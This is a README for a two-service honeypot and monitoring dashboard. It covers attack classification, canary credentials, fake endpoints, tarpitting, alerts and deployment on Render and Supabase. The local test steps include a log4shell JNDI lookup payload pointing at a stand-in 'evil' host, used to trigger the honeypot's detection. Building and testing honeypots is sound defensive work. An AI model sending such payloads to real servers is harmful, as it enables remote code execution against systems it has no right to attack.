# Honeypot v2 + Dashboard

Two small services that share one database:

```
Internet -> Cloudflare/Render -> honeypot (honeypot/app.py) --writes--> Supabase Postgres <--reads-- dashboard (dashboard/app.py) <- you
```

## What's new vs. v1
| Feature | Where |
|---|---|
| Attack classification (SQLi, XSS, RCE, log4shell, traversal, SSRF, webshell probes) + MITRE ATT&CK id + severity 0-10 | `honeypot/detect.py` |
| **Canary credentials**: every fake `.env` / API key / JWT contains a unique secret; if one is ever sent back to us (login form, `Authorization` header, URL) the event is flagged `canary_reuse` (sev 10) and linked to the IP it was issued to | `honeypot/app.py` |
| Fake REST API (`/api/v1/auth/login` returns a fake JWT for any password, `/api/v1/keys`, `/api/v1/users`), fake Jenkins script console (captures pasted payloads) | `honeypot/app.py` |
| Per-IP threat score, tarpit (3 s delay) once score >= `TARPIT_SCORE` | `honeypot/app.py` |
| Discord/Slack webhook alerts for severity >= `ALERT_MIN` | `ALERT_WEBHOOK_URL` |
| Live dashboard, JSON API, blocklist export, one-click block | `dashboard/` |

All keys, passwords and data served are fake. Nothing executes attacker input.

## Run locally (SQLite, no setup)
    cd honeypot2
    pip install -r requirements.txt
    uvicorn honeypot.app:app --port 8000 &
    uvicorn dashboard.app:app --port 8001 &     # open http://localhost:8001 (token = DASH_TOKEN, any value if unset)
    curl localhost:8000/.env
    curl -X POST localhost:8000/wp-login.php -d "username=admin&password=admin123"
    curl "localhost:8000/x?q=\${jndi:ldap://evil/a}"

## Deploy (Render + Supabase)
1. Use the **same Supabase project** as v1 or a new one. Tables are created automatically on first start
   (`common/db.py`); no manual SQL needed. Use the **Session pooler** connection string.
2. Render -> New -> Blueprint -> pick this repo, set **Root Directory** to `honeypot2`. It creates `hp2-honeypot`
   and `hp2-dashboard`. Set `DATABASE_URL` (same value on both). Render generates `DASH_TOKEN` - copy it from
   the dashboard service's Environment tab; that is the dashboard password.
3. Optional: `MY_IPS` (your IPs, excluded from scoring), `ALERT_WEBHOOK_URL` (Discord/Slack).
4. Keep the honeypot awake with an UptimeRobot ping on `/healthz` (not logged).

## Dashboard API (header `X-Token: <DASH_TOKEN>` or `?token=`)
`/api/summary` `/api/events` `/api/top_ips` `/api/categories` `/api/mitre` `/api/timeline` `/api/canaries`
`/api/blocklist.txt` `POST /api/block/{ip}`

## Ethics / safety
Run only on infrastructure you own, keep the dashboard behind its token, never put real credentials in lures,
and be aware the logs contain attacker IPs and whatever they submit.
